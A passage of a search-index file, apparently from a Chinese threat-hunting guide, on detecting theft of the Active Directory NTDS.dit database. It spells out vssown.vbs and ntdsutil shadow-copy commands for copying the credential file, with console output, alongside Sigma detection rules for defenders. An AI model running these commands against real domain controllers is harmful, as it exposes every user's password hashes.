<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002\u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u57282016+\u57df\u63a7\u4e0a\u4f7f\u7528 ntdsutil snapshot mount\u5bfc\u51fantds.dit</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_2","title":"\u521b\u5efa\u5feb\u7167","text":"<pre><code>cscript vssown.vbs /start\ncscript vssown.vbs /create c\ncscript vssown.vbs /list\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy11\\windows\\ntds\\ntds.dit C:\\\ncscript vssown.vbs /delete\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_3","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_4","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Users\\Administrator\\Desktop\\test&gt;cscript vssown.vbs /start\nMicrosoft (R) Windows Script Host Version 5.812\n\u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\n[*] Signal sent to start the VSS service.\n\nC:\\Users\\Administrator\\Desktop\\test&gt;cscript vssown.vbs /create c\nMicrosoft (R) Windows Script Host Version 5.812\n\u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\n[*] Attempting to create a shadow copy.\n\nC:\\Users\\Administrator\\Desktop\\test&gt;cscript vssown.vbs /list\nMicrosoft (R) Windows Script Host Version 5.812\n\u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nSHADOW COPIES\n=============\n\n[*] ID:                  {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}\n[*] Client accessible:   True\n[*] Count:               1\n[*] Device object:       \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n[*] Differential:        True\n[*] Exposed locally:     False\n[*] Exposed name:\n[*] Exposed remotely:    False\n[*] Hardware assisted:   False\n[*] Imported:            False\n[*] No auto release:     True\n[*] Not surfaced:        False\n[*] No writers:          True\n[*] Originating machine: ICBC.abcc.org\n[*] Persistent:          True\n[*] Plex:                False\n[*] Provider ID:         {B5946137-7B9F-4925-AF80-51ABD60B20D5}\n[*] Service machine:     ICBC.abcc.org\n[*] Set ID:              {584C48BF-649D-4B35-9CAE-3165C2C8BE53}\n[*] State:               12\n[*] Transportable:       False\n[*] Volume name:         \\\\?\\Volume{16da2094-7213-420f-a023-db7b3e3a7f6f}\\\n\n\nC:\\Users\\Administrator\\Desktop\\test&gt;copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit C:\\\n\u5df2\u590d\u5236         1 \u4e2a\u6587\u4ef6\u3002\n\nC:\\Users\\Administrator\\Desktop\\test&gt;cscript vssown.vbs /delete\nMicrosoft (R) Windows Script Host Version 5.812\n\u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6d4b\u8bd5\u7559\u75d5\u65e5\u5fd7\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/12306Bro/Threathunting-book/blob/master/Eventdata/vssown.evtx</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u4f7f\u7528vssown.vbs\u62ff\u5230NTDS.dit\u6587\u4ef6\ndescription: windows server 2016+ AD\u57df\u63a7\ntags: T1003-003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        New processname: C:\\Windows\\System32\\cscript.exe\n        Process commandline:\n           - cscript  *.vbs /start #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b\n           - cscript  *.vbs /create c #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b\n           - cscript  *.vbs /delete #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b\n           - cscript  *.vbs /list #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b\n    condition: selection\n---\ndetection:\n    selection1:\n        EventID: 4904 #\u5df2\u8bd5\u56fe\u6ce8\u518c\u5b89\u5168\u4e8b\u4ef6\u6e90\u3002\n        Processname: C:\\Windows\\System32\\VSSVC.exe\n        Source name: VSSAudit #\u4e8b\u4ef6\u6e90\n    selection2:\n        EventID: 8222 #\u5df2\u521b\u5efa\u5f71\u5b50\u526f\u672c\u3002\n        Process image name: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\n        Raw volume: \\\\?\\Volume{*}\\ #\"*\"\u4ee3\u8868\u6b63\u5219\u5339\u914d\n        Shadow device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy* #\"*\"\u4ee3\u8868\u6b63\u5219\u5339\u914d\n    selection3:\n        EventID: 4905 #\u5df2\u8bd5\u56fe\u53d6\u6d88\u6ce8\u518c\u5b89\u5168\u4e8b\u4ef6\u6e90\u3002\n        Processname: C:\\Windows\\System32\\VSSVC.exe\n        Source name: VSSAudit #\u4e8b\u4ef6\u6e90\n    \u200btimeframe: last 10S #\u81ea\u5b9a\u4e49\u65f6\u95f4\u8303\u56f4\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_7","title":"\u5efa\u8bae","text":"<p>\u6b64\u68c0\u6d4b\u7279\u5f81\u4ec5\u9002\u7528\u4e8ewindows AD\u57df\u63a7\u4e3b\u673a\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003-003</p> <p>https://attack.mitre.org/techniques/T1003/003</p> <p>vssown.vbs\u4e0b\u8f7d\u5730\u5740</p> <p>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</p> <p>\u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6</p> <p>https://xz.aliyun.com/t/2187</p> <p>MITRE ATT&amp;CK\u653b\u51fb\u77e5\u8bc6\u5e93\uff08\u4f01\u4e1a\uff09\u4e2d\u6587\u7248</p> <p>https://hansight.github.io/#/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/","title":"T1003-003-win-\u4f7f\u7528ntdsutil\u83b7\u5f97NTDS.dit\u6587\u4ef6","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002</p> <p>\u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002</p> <p>\u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002</p> <p>\u5377\u5f71\u590d\u5236</p> <p>secretsdump.py</p> <p>\u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe</p> <p>\u8c03\u7528\u5377\u5f71\u526f\u672c</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#ntdsdit","title":"NTDS.dit","text":"<p>Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002\u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u57282008+\u57df\u63a7\u4e0a\u4f7f\u7528 ntdsutil snapshot mount\u5bfc\u51fantds.dit</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_2","title":"\u521b\u5efa\u5feb\u7167","text":"<pre><code>ntdsutil snapshot  \"activate  instance ntds\"  create  quit quit\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#ntdsutil","title":"Ntdsutil\u6302\u8f7d\u57df\u5feb\u7167","text":"<pre><code>ntdsutil snapshot  \"mount {GUID}\" quit  quit\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_3","title":"\u590d\u5236\u5feb\u7167","text":"<pre><code>copy C:\\$SNAP_201212082315_VOLUMEC$\\windows\\NTDS\\ntds.dit  c:\\ntds.dit #\u6ce8\u610f\u8def\u5f84\u5927\u5c0f\u5199\u95ee\u9898\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_4","title":"\u5378\u8f7d\u5feb\u7167","text":"<pre><code>ntdsutil snapshot  \"unmount {GUID}\" quit  quit\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_5","title":"\u5220\u9664\u5feb\u7167","text":"<pre><code>ntdsutil snapshot  \"delete {GUID}\" quit  quit\n\nntsutil.exe +PWPR(Passcape Windows Password Recovery)\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_6","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_7","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_8","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\u30014688\u8fdb\u7a0b\u521b\u5efa\u3001Ntsutil.exe\u8fdb\u7a0b\u540d\u79f0\u3002</p> <p></p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_9","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<pre><code>title: Dumping ntds.dit remotely via DCSync\nid: 51238c62-2b29-4539-ad75-e94575368a12\ndescription: ntds.dit retrieving using synchronisation with legitimate domain controller using Directory Replication Service Remote Protocol\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/24\nmodified: 2019/11/13\nreferences:\n    - https://twitter.com/gentilkiwi/status/1003236624925413376\n    - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4624\n        ComputerName: '%DomainControllersNamesList%'\n    selection2:\n        IpAddress: '%DomainControllersIpsList%'\n    selection3:\n        EventID: 4662\n        ComputerName: '%DomainControllersNamesList%'\n        SubjectLogonId: '%SuspiciousTargetLogonIdList%'\n        Properties|contains: \n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n    condition: write TargetLogonId from selection1 (if not selection2) to list %SuspiciousTargetLogonIdList%; then if selection3 -&gt; alert\nfalsepositives:\n    - Legitimate administrator adding new domain controller to already existing domain\nlevel: medium\nstatus: experimental\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_10","title":"\u5efa\u8bae","text":"<p>\u68c0\u6d4b\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u9a8c\u8bc1\uff0c\u8c28\u614e\u4f7f\u7528\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/#_11","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003-003</p> <p>https://attack.mitre.org/techniques/T1003/003</p> <p>\u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6</p> <p>https://xz.aliyun.com/t/2187</p> <p>NTDS.dit\u5bc6\u7801\u5feb\u901f\u63d0\u53d6\u5de5\u5177</p> <p>https://www.secpulse.com/archives/6301.html</p> <p>\u57dfhash\u503c\u7834\u89e3\u7684\u603b\u7ed3\u7ecf\u9a8c</p> <p>https://www.cnblogs.com/backlion/p/6785639.html?utm_source=itdadao&amp;utm_medium=referral</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/","title":"T1003-003-win-\u57fa\u4e8e\u5e94\u7528\u65e5\u5fd7\u68c0\u6d4bNtdsutil\u83b7\u53d6\u51ed\u8bc1","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002</p> <p>\u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002</p> <p>\u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002</p> <p>\u5377\u5f71\u590d\u5236</p> <p>secretsdump.py</p> <p>\u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe</p> <p>\u8c03\u7528\u5377\u5f71\u526f\u672c</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#ntdsdit","title":"NTDS.dit","text":"<p>Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002\u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u53c2\u8003\u94fe\u63a5\uff1a \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6\uff1ahttps://blog.csdn.net/Fly_hps/article/details/80641987</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5e94\u7528\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5e94\u7528\u65e5\u5fd7\u7559\u75d5\u6587\u4ef6\uff1ahttps://github.com/12306Bro/Threathunting-book/blob/master/Eventdata/ntds.evtx</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u5e94\u7528\u65e5\u5fd7\u68c0\u6d4bntdsutil\u83b7\u53d6NTDS.dit\u6587\u4ef6\ndescription: windows server 2008 + AD\u57df\u63a7\nreferences: https://blog.csdn.net/Fly_hps/article/details/80641987\ntags: T1003-003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: application\ndetection:\n    selection1:\n        EventID: 2005\n        Message: 'lsass (*) \u5377\u5f71\u590d\u5236\u5b9e\u4f8b * \u6b63\u5728\u542f\u52a8\u3002\u8fd9\u5c06\u662f\u4e00\u6b21\u5b8c\u6574\u7684\u5377\u5f71\u590d\u5236\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d\n    selection2:\n        EventID: 2001\n        Message: 'lsass (*) \u5377\u5f71\u526f\u672c\u5b9e\u4f8b * \u51bb\u7ed3\u5df2\u5f00\u59cb\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d\n    selection3:\n        EventID: 2003\n        Message: 'lsass (*) \u5377\u5f71\u526f\u672c\u5b9e\u4f8b * \u51bb\u7ed3\u5df2\u505c\u6b62\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d\n    selection4:\n        EventID: 2006\n        Message: 'lsass (*) \u5377\u5f71\u590d\u5236\u5b9e\u4f8b * \u5df2\u6210\u529f\u5b8c\u6210\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d\n    selection5:\n        EventID: 300\n        Message: lsass (*) \u6570\u636e\u5e93\u5f15\u64ce\u6b63\u5728\u521d\u59cb\u5316\u6062\u590d\u6b65\u9aa4\u3002 #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d\n    selection6:\n        EventID: 216 #\u671f\u95f4\u89e6\u53d1\u5927\u91cf216\u4e8b\u4ef6\n        Message: 'lsass 